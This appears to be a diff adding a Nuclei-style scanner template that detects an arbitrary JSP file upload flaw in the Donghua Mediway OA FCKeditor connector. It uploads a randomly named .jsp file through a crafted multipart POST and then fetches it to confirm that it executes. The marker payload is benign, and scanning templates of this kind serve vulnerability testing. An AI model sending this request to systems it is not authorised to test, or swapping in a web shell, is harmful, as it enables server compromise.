@@ -1,0 +1,49 @@
+id: donghua-mediway-oa-connector-file-upload
+info:
+  name: Donghua Mediway OA Connector Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    A file upload vulnerability in the Donghua Mediway OA Connector allows attackers to upload arbitrary JSP files.
+
+variables:
+  random: '{{rand_base(6)}}'
+  content: '{{rand_base(32)}}'
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - '{{BaseURL}}/common/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=FileUpload&Type&CurrentFolder=/'
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryt1qdEWTI01cj5BLV
+    body: |
+      ------WebKitFormBoundaryt1qdEWTI01cj5BLV
+      Content-Disposition: form-data; name="NewFile"; filename="{{random}}.jsp"
+      Content-Type: image/jpeg
+
+      <% out.println("{{content}}"); %>
+      ------WebKitFormBoundaryt1qdEWTI01cj5BLV
+      Content-Disposition: form-data; name="Submit"
+
+      upload
+      ------WebKitFormBoundaryt1qdEWTI01cj5BLV--
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: verify-upload
+    method: GET
+    path:
+      - '{{BaseURL}}/common/FCKeditor/UserFiles/{{random}}.jsp'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '{{content}}'
+        part: body
